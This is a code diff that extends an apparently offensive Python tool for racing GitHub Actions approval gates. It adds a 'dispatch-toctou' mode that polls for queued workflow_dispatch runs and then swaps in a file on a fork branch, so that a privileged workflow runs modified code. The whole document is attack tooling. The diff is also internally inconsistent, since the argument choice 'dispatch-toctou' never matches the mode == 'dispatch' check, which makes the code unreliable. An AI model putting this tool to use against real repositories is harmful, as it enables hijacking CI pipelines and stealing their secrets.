@@ -175,7 +175,27 @@ def create_or_update_file(fork_repo, fork_branch,file_content,file_path, file_sh
         print(f"Failed to create or update {file_path} file in the fork repository.")
         print("Response:", response.json())
 
-def main(target_pr, repo, fork_repo, fork_branch, search_string, mode, update_file, update_path):
+def get_workflow_runs(repo, workflow_name, event):
+    """
+    Get workflow runs for a specific workflow in a GitHub repository.
+
+    Parameters:
+    repo (str): The repository in the format 'owner/repo'.
+    workflow_name (str): The name of the workflow file.
+
+    Returns:
+    list: A list of workflow runs.
+    """
+    url = f"https://api.github.com/repos/{repo}/actions/workflows/{workflow_name}/runs?event={event}"
+    response = requests.get(url, headers=AUTH_HEADER)
+
+    if response.status_code == 200:
+        return response.json()["workflow_runs"]
+    else:
+        print(f"Error getting workflow runs, code: {response.status_code}")
+        return []
+
+def main(target_pr, repo, fork_repo, fork_branch, search_string, mode, update_file, update_path, target_workflow):
     """
     Main function to monitor GitHub issue comments and create or update a file in a repository.
 
@@ -188,6 +208,7 @@ def main(target_pr, repo, fork_repo, fork_branch, search_string, mode, update_fi
     mode (str): The mode of operation: 'comment', 'environment' or 'label'.
     update_file (str): The path to the local file to be updated.
     update_path (str): The path in the repository where the file should be updated.
+    target_workflow (str): The name of the target workflow file for 'dispatch-toctou' mode.
 
     Returns:
     None
@@ -239,6 +260,16 @@ def main(target_pr, repo, fork_repo, fork_branch, search_string, mode, update_fi
             else:
                 print(f"Label {search_string} not found. Retrying in 500ms...")
                 time.sleep(.50)
+    elif mode == 'dispatch':
+        while True:
+            workflow_runs = get_workflow_runs(repo, target_workflow, "workflow_dispatch")
+            if any((run["status"] == "pending" or run["status"] == "requested") for run in workflow_runs):
+                print(f"Workflow {target_workflow} is queued. Proceeding to create {update_path}.")
+                create_or_update_file(fork_repo, fork_branch, file_contents, update_path, file_sha)
+                break
+            else:
+                print(f"Workflow {target_workflow} is not queued. Retrying in 500ms...")
+                time.sleep(0.5)
 
     else:
         print("Invalid mode specified. Please use either 'comment' or 'environment'.")
@@ -249,10 +280,11 @@ if __name__ == "__main__":
     parser.add_argument("--repo", type=str, required=True,help="Repository in the format 'owner/repo'.")
     parser.add_argument("--fork-repo", type=str, required=True, help="Fork repository in the format 'owner/repo'.")
     parser.add_argument("--fork-branch", type=str, required=True, help="Branch name in the fork repository.")
-    parser.add_argument("--mode", type=str, required=True, choices=["comment", "environment", "label"], help="Mode of operation: 'comment', 'environment' or 'label'.")
+    parser.add_argument("--mode", type=str, required=True, choices=["comment", "environment", "label", "dispatch-toctou"], help="Mode of operation: 'comment', 'environment', 'label', or 'dispatch-toctou'.")
     parser.add_argument("--search-string", type=str, required=False, default="", help="Specific issue comment prefix or full label to search for.")
     parser.add_argument("--update-file", type=str, required=True, help="Path to the local file to be updated.")
     parser.add_argument("--update-path", type=str, required=True, help="Path in the repository where the file should be updated.")
+    parser.add_argument("--target-workflow", type=str, required=False, help="Name of the target workflow file for 'dispatch-toctou' mode.")
 
     args = parser.parse_args()
 
@@ -260,5 +292,4 @@ if __name__ == "__main__":
         if not args.search_string:
             parser.error("Search string is required for 'comment' and 'label' modes.")
 
-
-    main(args.target_pr, args.repo, args.fork_repo, args.fork_branch, args.search_string, args.mode, args.update_file, args.update_path)
+    main(args.target_pr, args.repo, args.fork_repo, args.fork_branch, args.search_string, args.mode, args.update_file, args.update_path, args.target_workflow)
